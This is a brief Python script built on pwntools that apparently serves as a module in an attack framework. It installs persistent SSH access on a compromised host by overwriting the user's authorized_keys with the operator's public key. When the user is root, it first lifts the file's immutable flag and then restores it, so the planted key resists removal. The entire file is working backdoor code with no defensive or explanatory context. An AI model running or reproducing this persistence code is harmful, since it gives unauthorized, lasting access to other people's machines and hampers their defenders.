#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

def execute(session, configs, params):

    remote_ssh_dir = "/home/" + session.user + "/.ssh/" if session.user != "root" else "/root/.ssh/"
   
    try: 
        shell = session.shell("/bin/bash")
        shell.sendline("mkdir -p " + remote_ssh_dir)
        output = str(shell.recvrepeat(0.2), "UTF-8")

        # Make authorized_keys susceptible
        if session.user == "root":
            print("reached")
            shell.sendline("chattr -i " + remote_ssh_dir + "authorized_keys")
            output = str(shell.recvrepeat(0.2), "UTF-8")

        session.upload_file(configs["KeyFilePub"], remote_ssh_dir + "authorized_keys")

        if session.user == "root":
            shell.sendline("chattr +i " + remote_ssh_dir + "authorized_keys")
            output = str(shell.recvrepeat(0.2), "UTF-8")

        shell.close()
        return 0
    except:
        return 2
